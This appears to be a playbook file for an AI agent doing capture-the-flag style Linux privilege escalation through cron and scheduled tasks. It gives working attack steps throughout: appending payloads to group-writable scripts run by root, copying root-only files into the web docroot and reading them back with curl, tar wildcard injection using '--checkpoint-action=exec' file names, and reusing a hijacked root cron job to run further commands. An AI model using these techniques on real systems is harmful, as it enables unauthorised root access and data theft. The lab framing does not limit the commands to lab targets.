---
id: privesc-cron
title: Cron/scheduled-task privesc — writable scripts, tar wildcard injection
triggers: [cron, crontab, tar, checkpoint, wildcard, scheduled, systemctl list-timers]
---

# Cron / scheduled-task privesc

- Group-writable script executed by root cron/timer → append a payload
  line (e.g. `cp /root/flag.txt /tmp/x; chmod 644 /tmp/x`), use the
  `wait` tool for the interval, then check the output file ONCE.
  Minutely crons need up to ~70s.
- **Reading the output through a webshell?** apache/nginx services
  commonly run `PrivateTmp=yes` — the webshell's `/tmp` is a systemd
  namespace, NOT the host's. A root job's `/tmp/flag` is invisible to it.
  Exfil into the docroot instead:
  `cat /root/root.txt > /var/www/html/x.txt` → read via
  `curl http://host/x.txt` or `cat` through the shell.
  Verify early: `systemctl show apache2 -p PrivateTmp`.
- Don't append the payload to the webshell file itself — `>>` on the
  wrong target prints your line into every subsequent response as junk.
- tar wildcard privesc: checkpoint files must land INSIDE the tarred
  directory:

  ```bash
  cd /path/spool && touch -- '--checkpoint=1' '--checkpoint-action=exec=sh pwn.sh'
  ```

  then POLL the output file until the cron run produces it.

- After planting an async trigger (cron/wildcard), call `wait` for the
  trigger interval — typing `sleep` into the pane wedges it.
- A proven root-exec primitive (caps: in FACTS) is reusable: the cron you
  already hijacked can `docker cp`, `cp /root/*`, or drop anything else
  you still need — check caps FIRST before deriving a new vector.
